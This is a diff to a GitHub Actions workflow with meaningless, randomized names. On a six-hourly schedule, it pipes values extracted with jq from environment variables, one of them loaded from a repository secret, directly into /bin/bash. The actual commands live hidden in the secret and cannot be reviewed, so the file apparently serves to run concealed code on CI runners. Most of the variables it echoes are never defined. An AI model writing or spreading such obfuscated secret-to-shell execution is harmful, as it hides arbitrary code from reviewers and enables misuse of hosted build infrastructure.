@@ -3,20 +3,28 @@ name: caocao19870104
 on:
   workflow_dispatch:
   schedule:
-    - cron: '1 4/6 * * *'
+    - cron: '50 0/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: caocao19870104
         env:
-          tkv3451: ${{ secrets.tkv3451 }}
+          xtu3: ${{ secrets.xtu3 }}
         run: |
-          echo $tkv3451 | jq -r .bkf79292 | /bin/bash
-          echo $bo85092 | jq -r .gvfuc9094 | /bin/bash
-          echo $smwpf9189 | jq -r .s081 | /bin/bash
-          echo $wqux36956 | jq -r .izvnv70 | /bin/bash
-          echo $a7114 | jq -r .whwyb71598 | /bin/bash
-          echo $yr78147 | jq -r .iwx07764 | /bin/bash
+          echo $xtu3 | jq -r .xi67480 | /bin/bash
+          echo $ms238 | jq -r .w44 | /bin/bash
+          echo $tjp6 | jq -r .qzd28546 | /bin/bash
+          echo $zswl588 | jq -r .ksix29 | /bin/bash
+          echo $l81 | jq -r .ip9553 | /bin/bash
+          echo $gh81 | jq -r .pqfui776 | /bin/bash
+          echo $ulcjk34841 | jq -r .bgkcw14243 | /bin/bash
+          echo $mq23055 | jq -r .qtqwj938 | /bin/bash
+          echo $mbitn14577 | jq -r .wo51 | /bin/bash
+          echo $zy40 | jq -r .w07 | /bin/bash
+          echo $jfxh5610 | jq -r .cixu4930 | /bin/bash
+          echo $eufnf88577 | jq -r .m86779 | /bin/bash
 
